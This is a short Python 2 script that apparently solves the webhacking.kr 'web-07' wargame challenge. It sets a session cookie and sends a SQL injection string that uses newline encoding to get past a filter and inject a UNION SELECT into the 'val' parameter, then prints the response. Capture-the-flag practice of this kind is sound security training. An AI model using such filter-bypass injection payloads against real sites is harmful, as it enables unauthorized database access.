#-*- coding: utf-8 -*-
import urllib2
import CookieManager

sessionId = "d106ebfb4bba898681f92c7f5316fa6b"
CookieManager.addCookie("PHPSESSID", sessionId)

injectionQuery = "1)%0aunion%0aselect%0a(1+1"
challengeUrl = "http://webhacking.kr/challenge/web/web-07/index.php?val=" + injectionQuery
httpRequest = urllib2.Request(challengeUrl)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
